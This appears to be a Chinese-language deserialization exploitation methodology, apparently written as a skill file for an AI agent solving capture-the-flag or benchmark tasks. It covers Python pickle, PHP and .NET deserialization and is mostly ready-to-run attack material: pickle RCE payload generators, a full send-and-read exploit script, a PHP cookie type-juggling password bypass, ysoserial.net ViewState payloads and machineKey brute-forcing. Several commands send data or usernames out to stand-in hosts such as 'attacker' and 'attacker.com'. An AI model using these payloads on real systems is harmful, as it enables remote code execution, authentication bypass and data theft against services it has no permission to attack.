# deserialization-methodology

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# 反序列化漏洞方法论

## 深入参考

- Pickle payload 模板库（回显/盲/文件上传/发送方式）→ [references/pickle-payload-templates.md](references/pickle-payload-templates.md)
- RCE 成功但无回显？盲利用外带策略 → [references/blind-exploitation.md](references/blind-exploitation.md)
- PHP 反序列化详解（POP Chain/Type Juggling/phpggc） → [references/php-deserialization.md](references/php-deserialization.md)
- .NET 反序列化利用（ViewState/BinaryFormatter/ysoserial.net） → [references/dotnet-deserialization.md](references/dotnet-deserialization.md)

## Phase 1: 检测反序列化入口

常见位置：Cookie 值、POST Body、Hidden 表单字段（viewstate）、API 参数、文件上传

**格式标识（Magic Bytes）**：

| 格式 | 识别特征 | 下一步 |
|------|----------|--------|
| Python Pickle | Base64 解码后 `\x80` 开头或含 `cos\n`（魔术字节） | → Phase 2 |
| PHP | `O:4:"User":2:{` 或 `a:N:{` 格式 | → Phase 3 |
| Java | Base64 解码后 `\xac\xed\x00\x05`（Magic Bytes）或 Base64 `rO0AB` 开头 | Java 反序列化利用 |

1. 提取所有 Cookie 和隐藏字段的值，尝试 Base64 解码
2. 检查 `Content-Type` 头：`application/x-python-pickle`、`application/x-java-serialized-object`
3. 观察错误信息中是否包含 `pickle`、`unserialize`、`ObjectInputStream` 等关键字
4. 上传 `.pkl`、`.ser` 等序列化文件格式，观察服务端行为
5. 修改序列化数据中的字段值，观察响应变化确认服务端确实反序列化了输入

## Phase 2: Python Pickle RCE

⚠️ **关键约束**：`__reduce__` 只能返回 `(模块级函数, 参数元组)` — `self.method` 会失败

1. 构造基础 RCE payload：使用 `__reduce__` 方法调用 `os.system` 或 `subprocess.check_output`
2. 回显 payload：`subprocess.check_output(['cat', '/flag.txt'])` — 直接在响应中看到结果
3. 无回显 payload：`os.system('cp /flag.txt /app/static/f.txt')` — 写文件到 Web 可访问路径
4. 外带 payload：`os.system('curl http://attacker/?d=$(cat /flag|base64)')` — HTTP 外传数据
5. 序列化并编码：`base64.b64encode(pickle.dumps(payload))` 后替换原始数据发送
6. 注意 Python 版本差异：Python 2/3 的 pickle 协议版本不同，可能需要指定 `protocol=2`

常见触发点：Flask session、Redis session、`Content-Type: application/x-python-pickle`、`.pkl` 文件上传

决策树：回显 payload → 无回显则写文件到 Web 路径 → 仍失败则读盲利用参考
→ 完整模板 → 读 `references/pickle-payload-templates.md`

## Phase 3: PHP 反序列化

1. 识别序列化字符串格式：`O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}`
2. Type Juggling 速查：`b:1`（boolean true）松散比较 `==` 可绕过任意密码验证
3. 修改属性值：直接修改序列化字符串中的字段（注意长度前缀 `s:N:` 要匹配）
4. POP Chain 构造：找到可控属性的类（如 `__destruct` 中调用 `file_put_contents`），通过链式属性控制实现任意文件写入或命令执行
5. phpggc 工具：`phpggc <framework>/<gadget> <type> <arg>` 自动生成常见框架的利用链
6. 常见框架 gadget：Laravel（RCE）、Symfony（文件写入）、WordPress（对象注入）
→ 完整 POP Chain/Type Juggling/phpggc 用法 → 读 `references/php-deserialization.md`

## Phase 4: Flag 获取

1. 反序列化 RCE 成功后优先执行：`cat /flag.txt`、`cat /FLAG.txt`
2. 列目录搜索：`ls /` → `find / -name "*flag*" 2>/dev/null`
3. 环境变量：`env | grep -i flag`
4. 无回显时写到 Web 路径：`cp /flag* /app/static/flag.txt` 然后 HTTP 访问
5. DNS/HTTP 外带：`curl http://attacker/$(cat /flag|base64)`
6. 检查数据库：`cat /app/config*` 获取连接信息后查询 flag 表


---

## REF: blind-exploitation

# 盲反序列化利用（无回显 RCE 的数据外带）

## 核心问题

反序列化 RCE 执行成功，但命令输出**不在 HTTP 响应中**。
常见场景：`os.system()` 返回退出码而非输出、服务端静默执行、异步处理。

## Python Pickle 盲利用策略

### 策略 1: 写文件到 Web 可访问路径（首选）

```python
# 生成 payload
python3 -c "import pickle,base64,os;exec('class E:\n def __reduce__(self):\n  return(os.system,(\"cat /flag.txt > /app/static/out.txt\",))');print(base64.b64encode(pickle.dumps(E())).decode())"
```
发送 payload 后访问 `http://target/static/out.txt`

**常见 Web 可写路径**:
- `/app/static/`, `/var/www/html/`, `/tmp/` (然后 LFI 读取)
- `/app/templates/` (然后访问对应模板路由)

### 策略 2: subprocess.check_output 直接回显

```python
python3 -c "import pickle,base64,subprocess;exec('class E:\n def __reduce__(self):\n  return(subprocess.check_output,([\"cat\",\"/flag.txt\"],))');print(base64.b64encode(pickle.dumps(E())).decode())"
```
如果服务端将反序列化结果直接返回，`subprocess.check_output` 的返回值（bytes）会出现在响应中。

### 策略 3: 利用响应差异做布尔盲注

```python
# 条件性 sleep — flag 第 N 个字符的 ASCII 值决定 sleep 时间
import os
class E:
    def __reduce__(self):
        return (os.system, ("sleep $(head -c1 /flag.txt | od -An -td1 | tr -d ' ' | awk '{print int($1/25)}') ",))
```

### 策略 4: DNS/HTTP 外带

```python
class E:
    def __reduce__(self):
        return (os.system, ("curl http://YOUR_SERVER/$(cat /flag.txt | base64)",))
```
⚠️ Benchmark 环境可能无出站网络，优先用策略 1/2。

## PHP 反序列化盲利用

```php
// POP Chain 目标方法改为写文件
file_put_contents('/var/www/html/pwned.txt', file_get_contents('/flag.txt'))
```

## 关键判断：os.system vs subprocess

| 函数 | 返回值 | 适用场景 |
|------|--------|---------|
| `os.system(cmd)` | 退出码 (int) | ⛔ 不回显！需写文件外带 |
| `subprocess.check_output([cmd])` | 命令输出 (bytes) | ✅ 可能回显到响应 |
| `os.popen(cmd).read()` | 命令输出 (str) | ✅ 可能回显到响应 |
| `exec()`/`eval()` | None | ⛔ 不回显 |

## 盲利用决策树

```
RCE payload 已发送但 HTTP 响应无 flag
├─ 确认 RCE 成功？→ 用 sleep 5 测试响应延迟
├─ subprocess.check_output 试过？→ 返回 bytes 可能被序列化到响应
├─ 找到 Web 可写路径？→ 写文件 + HTTP 访问
├─ /tmp/ 可写？→ 写 /tmp/ + LFI/SSRF 读取
└─ 以上都失败？→ 布尔盲注（time-based）
```


---

## REF: dotnet-deserialization

# .NET 反序列化利用参考

## 检测与识别

**常见危险 Formatter**：

| Formatter | 识别方式 | 危险等级 |
|-----------|---------|---------|
| BinaryFormatter | 二进制流，代码中搜索 `BinaryFormatter().Deserialize` | 极高 |
| ObjectStateFormatter | 用于 ViewState 序列化 | 极高 |
| SoapFormatter | SOAP XML 格式序列化 | 高 |
| NetDataContractSerializer | WCF 场景 | 高 |
| LosFormatter | 旧版 ViewState | 高 |
| Json.NET + TypeNameHandling | JSON 中含 `$type` 字段 | 高（需启用 TypeNameHandling） |

**代码审计关键词**：

```csharp
// 搜索以下危险模式
BinaryFormatter, Deserialize, ObjectStateFormatter
SoapFormatter, NetDataContractSerializer, LosFormatter
TypeNameHandling.Auto, TypeNameHandling.All, TypeNameHandling.Objects
JsonConvert.DeserializeObject
```

## ViewState 利用

ASP.NET ViewState 是页面状态的序列化存储，放在 `__VIEWSTATE` 隐藏字段中。

**利用条件判断**：

| .NET 版本 | MAC | 加密 | 利用条件 |
|-----------|-----|------|---------|
| 任意 | 禁用 | 禁用 | 直接利用，无需密钥 |
| < 4.5 | 启用 | 禁用 | 需获取 machineKey |
| < 4.5 | 任意 | 启用 | 可移除 `__VIEWSTATEENCRYPTED` 参数绕过 |
| >= 4.5 | 启用 | 启用 | 需获取 machineKey（validationKey + decryptionKey） |

**步骤一：无 MAC 保护时直接利用**：

```bash
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```

**步骤二：爆破 machineKey**：

```bash
# Blacklist3r 爆破
AspDotNetWrapper.exe --keypath MachineKeys.txt \
  --encrypteddata "VIEWSTATE_VALUE" --decrypt --purpose=viewstate \
  --modifier=VIEWSTATEGENERATOR_VALUE --macdecode \
  --TargetPagePath "/target.aspx" -f out.txt --IISDirPath="/"

# badsecrets (Python，跨平台)
python examples/blacklist3r.py --viewstate "VIEWSTATE_VALUE" --generator "GENERATOR_VALUE"
python examples/blacklist3r.py --url http://target/page.aspx

# 大规模扫描
bbot -f subdomain-enum -m badsecrets -t target.tld
```

**步骤三：用已知 machineKey 生成 payload**：

```bash
# MAC 保护场景
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" \
  --generator=CA0B0334 \
  --validationalg="SHA1" \
  --validationkey="C551753B..."

# MAC + 加密场景
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "whoami" \
  --path="/content/default.aspx" --apppath="/" \
  --decryptionalg="AES" --decryptionkey="F6722806..." \
  --validationalg="SHA1" --validationkey="C551753B..."
```

**注意**：成功利用时服务器通常返回 500 错误（"The state information is invalid for this page"），同时触发 OOB 请求。

## Json.NET TypeNameHandling 利用

当 Json.NET 配置 `TypeNameHandling` 不为 `None` 时，反序列化时会根据 `$type` 字段实例化任意类型。

**危险配置**（任何非 `None` 的 `TypeNameHandling` 均可利用）：

```csharp
TypeNameHandling.Auto / .All / .Objects / .Arrays
```

**利用 payload（ObjectDataProvider gadget）**：

```bash
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
```

生成的 JSON payload 结构：

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd", "/c whoami"]
  },
  "ObjectInstance": {"$type": "System.Diagnostics.Process, System"}
}
```

## ysoserial.net 常用 Gadget Chain

| Gadget Chain | 关键原理 | 适用 Formatter |
|-------------|---------|---------------|
| TypeConfuseDelegate | 篡改 DelegateSerializationHolder 指向任意方法 | BinaryFormatter, SoapFormatter |
| ObjectDataProvider | WPF ObjectDataProvider 调用任意静态方法 | BinaryFormatter, Json.NET, XAML |
| TextFormattingRunProperties | 通过 XAML 加载触发命令执行 | BinaryFormatter (ViewState 常用) |
| ActivitySurrogateSelector | 绕过 .NET >= 4.8 类型过滤 | BinaryFormatter, LosFormatter |
| PSObject (CVE-2017-8565) | PowerShell ScriptBlock 执行 | BinaryFormatter, PS Remoting |
| DataSetOldBehaviour | 利用 DataSet 旧版 XML 表示 | LosFormatter, BinaryFormatter |

## 实战要点

**machineKey 泄露/复用**：
- 开发者常从 StackOverflow/文档复制示例 machineKey，导致多个站点共用同一密钥
- 获取一个站点的 machineKey 后可横向攻击整个 IIS 集群
- 检查 web.config 泄露、公开 GitHub 仓库、备份文件中的密钥

**BinaryFormatter Sink 识别**：
- 搜索所有 `BinaryFormatter().Deserialize()` 调用路径
- 关注 Cookie、ViewState、SOAP 消息、WebSocket 数据中的反序列化入口
- WSUS (TCP 8530/8531)、Sitecore、SharePoint 等产品存在已知 BinaryFormatter sink

---

## 决策树

```text
发现疑似 .NET 序列化数据
│
├── __VIEWSTATE 参数 → ASP.NET ViewState
│   ├── 1. 判断 MAC/加密状态
│   ├── 2. Blacklist3r/badsecrets 爆破 machineKey
│   └── 3. ysoserial.net -p ViewState 生成 payload
│
├── JSON 含 $type 字段 → Json.NET TypeNameHandling
│   └── ysoserial.net -g ObjectDataProvider -f Json.Net
│
└── 二进制流 / SOAP XML → BinaryFormatter / SoapFormatter
    ├── 1. 确认 Formatter 类型
    ├── 2. ysoserial.net 选择对应 gadget
    └── 3. TypeConfuseDelegate 优先尝试
```


---

## REF: php-deserialization

# PHP 反序列化详解

## 序列化格式
```
O:类名长度:"类名":属性数:{s:属性名长度:"属性名";类型:值;...}
```
示例：`O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}`

## 常见魔术方法利用链 (POP Chain)
- `__wakeup()` — unserialize() 后立即调用
- `__destruct()` — 对象销毁时调用
- `__toString()` — 对象被当作字符串时调用
- `__call()` — 调用不存在的方法时触发

**POP Chain 构造思路**：
1. 找到入口类（有 `__wakeup`/`__destruct`）
2. 找到文件操作类（有 `file_get_contents`/`file_put_contents`）
3. 通过属性赋值将入口类的方法调用链接到文件操作类
4. **读源码是关键**：用 LFI 或信息泄露获取 PHP 源码，分析类定义

## ⚠️ 反序列化 + Type Juggling 绕过（`b:1` Cookie 攻击）

**典型场景**：Cookie 中存储序列化登录凭据，`unserialize()` 后用 `==` 比较密码
```
# 原始序列化（正常登录）：
a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"12345";}

# Type Juggling 绕过：将 password 改为 boolean true
a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}
```
`b:1` 是 PHP 序列化的 `true`，`true == "任何密码字符串"` 在松散比较下为 true。

**攻击步骤**：
1. POST 登录观察 Set-Cookie（常见 cookie 名：`creds`, `auth`, `session`, `user`）
2. Base64 解码 cookie 值，识别 PHP 序列化格式 `a:N:{...}` 或 `O:N:"..."`
3. 将密码字段改为 `b:1;`（boolean true），重新 base64 编码
4. 用修改后的 cookie 访问目标

```
# 生成 payload
echo -n 'a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}' | base64
# 发送 payload
http_request url="http://target/" headers={"Cookie":"creds=<base64_payload>"}
```

## phpggc 工具（自动化 POP Chain）
```
phpggc -l                    # 列出支持的框架
phpggc Laravel/RCE1 system 'cat /flag.txt' | base64  # 生成payload
```
常见框架支持：Laravel, Symfony, Yii, WordPress, Drupal, Magento


---

## REF: pickle-payload-templates

# Pickle Payload 完整模板库

> 本文件包含各种场景下的 Python Pickle 反序列化 payload 生成脚本。
> 所有脚本保存为 `.py` 文件后直接执行，避免 shell 引号嵌套问题。

## ⚠️ 核心规则

**`__reduce__` 必须返回 `(模块级可调用对象, 参数元组)`**

✅ 正确:
```python
return (os.system, ("cat /flag.txt",))           # os.system 是模块级函数
return (subprocess.check_output, (["ls"],))       # subprocess.check_output 是模块级函数
return (eval, ("__import__('os').system('id')",)) # eval 是内置函数
```

❌ 错误 — 会导致 Internal Server Error:
```python
return (self.my_method, ())        # ❌ 实例方法不行！pickle 无法序列化 bound method
return (subprocess.call, ("ls",))  # ❌ call 的第一个参数是 list 或需要 shell=True
return (lambda: os.system("id"),)  # ❌ lambda 不可 pickle
```

---

## 模板 1: 回显 RCE（最优先）

目标将反序列化结果返回到 HTTP 响应时使用。`subprocess.check_output` 返回 bytes，可能被 repr/str 输出。

```python
# pickle_echo.py — 保存后执行: python3 pickle_echo.py
import pickle, base64, subprocess
class E:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag.txt'],))
payload = base64.b64encode(pickle.dumps(E())).decode()
print(payload)
```

变体 — 多路径尝试:
```python
# pickle_echo2.py — 保存后执行: python3 pickle_echo2.py
import pickle, base64, subprocess
class E:
    def __reduce__(self):
        return (subprocess.check_output, (['/bin/sh', '-c', 'cat /flag.txt 2>/dev/null || cat /flag 2>/dev/null || cat /FLAG.txt 2>/dev/null || ls /'],))
print(base64.b64encode(pickle.dumps(E())).decode())
```

## 模板 2: 写文件外带（无回显场景）

RCE 成功但响应中看不到输出时，将结果写入 Web 可访问路径。

```python
# pickle_write.py — 保存后执行: python3 pickle_write.py
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('cp /flag.txt /app/static/f.txt 2>/dev/null; cp /flag /app/static/f.txt 2>/dev/null; cp /FLAG.txt /app/static/f.txt 2>/dev/null',))
print(base64.b64encode(pickle.dumps(E())).decode())
```

发送 payload 后访问:
- `http://target/static/f.txt`
- `http://target/f.txt`

**常见 Web 可写路径**: `/app/static/`, `/var/www/html/`, `/app/templates/`, `/app/uploads/`

## 模板 3: eval 万能 payload

当不确定目标环境时，`eval` + `__import__` 组合最灵活:

```python
# pickle_eval.py — 保存后执行: python3 pickle_eval.py
import pickle, base64
class E:
    def __reduce__(self):
        return (eval, ("__import__('subprocess').check_output(['/bin/sh','-c','cat /flag.txt'])",))
print(base64.b64encode(pickle.dumps(E())).decode())
```

## 模板 4: 生成 .pkl 二进制文件（文件上传场景）

目标有 pickle 文件上传接口时使用:

```python
# gen_pkl.py — 保存后执行: python3 gen_pkl.py
import pickle, subprocess
class E:
    def __reduce__(self):
        return (subprocess.check_output, (['/bin/sh', '-c', 'cat /flag.txt'],))
with open('/tmp/exploit.pkl', 'wb') as f:
    f.write(pickle.dumps(E()))
print('saved /tmp/exploit.pkl, size:', len(pickle.dumps(E())))
```

然后用 curl 上传:
```bash
curl -s -X POST -F 'pickle_file=@/tmp/exploit.pkl' http://target/
curl -s -X POST -F 'file=@/tmp/exploit.pkl' http://target/upload
```

## 模板 5: 一体化脚本（生成 + 发送 + 读结果）

适合需要精确控制整个过程的场景:

```python
# pickle_exploit.py — 保存后执行: python3 pickle_exploit.py http://target:8080/api/load
import pickle, base64, subprocess, urllib.request, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else 'http://target/'

# 生成 payload
class E:
    def __reduce__(self):
        return (subprocess.check_output, (['/bin/sh', '-c', 'cat /flag.txt 2>/dev/null || cat /flag 2>/dev/null || ls /'],))

payload = pickle.dumps(E())

# 发送方式 1: raw POST body
req = urllib.request.Request(TARGET, data=payload, method='POST')
req.add_header('Content-Type', 'application/octet-stream')
try:
    resp = urllib.request.urlopen(req, timeout=10)
    print('Response:', resp.read().decode(errors='replace'))
except Exception as e:
    print('Raw POST failed:', e)

# 发送方式 2: base64 POST
b64 = base64.b64encode(payload).decode()
req2 = urllib.request.Request(TARGET, data=b64.encode(), method='POST')
req2.add_header('Content-Type', 'text/plain')
try:
    resp2 = urllib.request.urlopen(req2, timeout=10)
    print('Base64 POST Response:', resp2.read().decode(errors='replace'))
except Exception as e:
    print('Base64 POST failed:', e)
```

使用: `python3 pickle_exploit.py http://target:8080/api/load`

## 模板 6: pickle 协议版本兼容

某些旧 Python 环境需要低版本协议:

```python
# pickle_compat.py — 保存后执行: python3 pickle_compat.py
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt > /app/static/f.txt',))

# 协议 0（ASCII，最大兼容性）
print('Protocol 0:', base64.b64encode(pickle.dumps(E(), protocol=0)).decode())
# 协议 2（Python 2/3 兼容）
print('Protocol 2:', base64.b64encode(pickle.dumps(E(), protocol=2)).decode())
# 协议 4（默认，Python 3.4+）
print('Protocol 4:', base64.b64encode(pickle.dumps(E(), protocol=4)).decode())
```

## 模板 7: exec 多步操作

需要执行多条语句时（如先读文件再写文件）:

```python
# pickle_exec.py — 保存后执行: python3 pickle_exec.py
import pickle, base64
class E:
    def __reduce__(self):
        code = '''
import os, subprocess
try:
    flag = open('/flag.txt').read()
    open('/app/static/out.txt','w').write(flag)
except:
    try:
        flag = subprocess.check_output(['find','/','-name','flag*','-maxdepth','3']).decode()
        open('/app/static/out.txt','w').write(flag)
    except:
        pass
'''
        return (exec, (code,))
print(base64.b64encode(pickle.dumps(E())).decode())
```

## 发送方式速查

| 场景 | 发送方法 |
|------|---------|
| Cookie 中的 pickle | `http_request headers={"Cookie":"session=<b64>"}` |
| POST body (raw) | `curl -s -X POST --data-binary @/tmp/exploit.pkl http://target/` |
| POST body (base64) | `http_request method="POST" body="<b64>" headers={"Content-Type":"text/plain"}` |
| 文件上传 | `curl -s -F 'file=@/tmp/exploit.pkl' http://target/upload` |
| multipart pickle_file | `curl -s -F 'pickle_file=@/tmp/exploit.pkl' http://target/` |
| query param | `http_request url="http://target/?data=<url_encoded_b64>"` |

## 验证 RCE 成功

如果不确定 RCE 是否执行:
```python
# pickle_sleep.py — 用 sleep 测试，如果响应延迟 5 秒说明 RCE 成功
# 保存后执行: python3 pickle_sleep.py
import pickle, base64, os
class E:
    def __reduce__(self):
        return (os.system, ('sleep 5',))
print(base64.b64encode(pickle.dumps(E())).decode())
```
